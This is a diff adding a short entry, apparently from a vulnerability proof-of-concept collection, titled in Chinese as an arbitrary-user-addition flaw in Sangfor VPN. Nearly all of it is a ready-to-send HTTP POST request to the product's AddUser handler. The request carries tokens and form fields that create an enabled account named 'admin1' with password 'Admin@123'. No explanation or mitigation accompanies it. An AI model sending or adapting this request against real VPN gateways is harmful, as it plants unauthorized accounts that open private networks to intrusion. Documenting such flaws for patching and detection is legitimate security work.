@@ -1,0 +1,11 @@
+# 深信服VPN任意用户添加漏洞
+# 深信服VPN存在任意用户添加漏洞
+POST /cgi-bin/php-cgi/html/delegatemodule/HttpHandler.php?controler=User&action=AddUser&token=e52021a4c9c962ac9cc647effddcf57242d152d9&acid=80001906&bid=hd_tag_m8mv24me HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv24me
+RM-PRO-Token: b0c78cae47fc0270aa43093ca8214b31
+RM-PRO-Time: 1742808392147
+User-Agent: curl/7.83.1
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+name=admin1&note=admin1&passwd=Admin%40123&passwd2=Admin%40123&phone=&grpid=-1&grptext=%2F%E9%BB%98%E8%AE%A4%E7%94%A8%E6%88%B7%E7%BB%84&selectAll=1&b_inherit_auth=1&b_inherit_grpolicy=1&is_Autoip=1&allocateip=0.0.0.0&gqsj=1&ex_time=2027-07-29&is_enable=1&is_public=1&is_pwd=1&first_psw_type=-1&second_server=&auth_type=0&ext_auth_id=&token_svr_id=%E8%AF%B7%E9%80%89%E6%8B%A9&grpolicy_id=0&grpolicytext=%E9%BB%98%E8%AE%A4%E7%AD%96%E7%95%A5%E7%BB%84&roleid=&roletext=&year=&month=&day=&isBindKey=&userid=0&crypto_key=&szcername=&caid=-1&certOpt=0&create_time=&sec_key=&first_psw_name=%E6%9C%AC%E5%9C%B0%E6%95%B0%E6%8D%AE%E5%BA%93&first_psw_id=&second_psw_name=&second_psw_id=&is_extauth=0&secondAuthArr=%5B%5D
